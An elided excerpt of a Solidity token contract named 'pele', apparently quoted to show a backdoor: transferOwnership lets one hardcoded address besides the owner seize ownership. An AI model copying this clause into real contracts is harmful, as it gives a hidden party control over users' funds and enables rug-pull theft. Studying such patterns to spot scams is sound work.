...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x5A30910f009908E3D26F957C78844C4213DB1586));
...
contract pele is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "pel";
  string private _name = "pele";
